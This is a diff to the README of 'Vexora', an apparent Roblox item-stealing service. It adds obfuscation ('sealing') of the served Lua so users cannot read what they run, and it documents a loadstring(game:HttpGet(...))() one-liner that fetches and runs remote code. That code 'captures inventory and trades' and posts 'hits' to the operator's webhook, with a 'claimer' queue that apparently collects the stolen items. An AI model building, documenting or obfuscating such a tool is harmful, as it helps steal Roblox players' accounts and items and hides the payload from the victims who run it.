@@ -47,6 +47,7 @@ The server reads `process.env` directly, so any process manager works.
 | `PORT` | `5175` | HTTP port |
 | `HOST` | `127.0.0.1` | Bind address. Use `0.0.0.0` to accept LAN devices |
 | `PUBLIC_URL` | derived | Public origin baked into loadstring URLs, e.g. `https://elow.cc` |
+| `SCRIPT_SECRET` | `PUBLIC_URL` | Extra seed mixed into each sealed Lua payload |
 | `ACCOUNT_API_URL` | `https://cloud-credential-compass.lovable.app` | Base URL of the external account service |
 | `ACCOUNT_API_KEY` | unset | Enables managed accounts. Server-only secret, never commit it |
 | `DISCORD_CLIENT_ID` | unset | Enables the optional Discord sign-in button |
@@ -134,7 +135,10 @@ Keep Vexora running under a supervisor. A systemd unit is included at
 ## Roblox scripts
 
 Both scripts are served per account and baked with that account's token — never publish your
-own generated URLs.
+own generated URLs. The `/raw` responses are **sealed**: a base64 payload behind a small Lua
+loader, so the served file is not readable Lua. `/script` shows only the loadstring to members;
+an admin can reveal the unsealed source through `GET /api/script/source`. The plaintext templates
+live in `server/scripts/` and are never part of the static assets.
 
 - **Sealer** (`/script`): `loadstring(game:HttpGet("https://elow.cc/raw/<token>.lua"))()`
   captures inventory and trades, and posts hits to your webhook token.
@@ -294,9 +298,11 @@ GET    /health
 ```
 server/server.js   Node bootstrap: env, store, claimer engine, listen
 server/app.js      shared router: routes, auth, JSON API, SSE
+server/script-seal.js  Lua payload sealer used by both runtimes
+server/scripts/    client + claimer Lua templates (server-side only)
 server/db.js       JSON store for the Node build
 server/claimer.js  claim queue, desktop launcher, Roblox lookups
-public/            SPA, assets, CSS, Lua templates
+public/            SPA, assets, CSS (no Lua)
 worker/index.js    Workers entry: API to the Durable Object, else assets
 worker/durable.js  DO wrapper around server/app.js
 worker/store.js    DO SQLite store (same API as db.js)
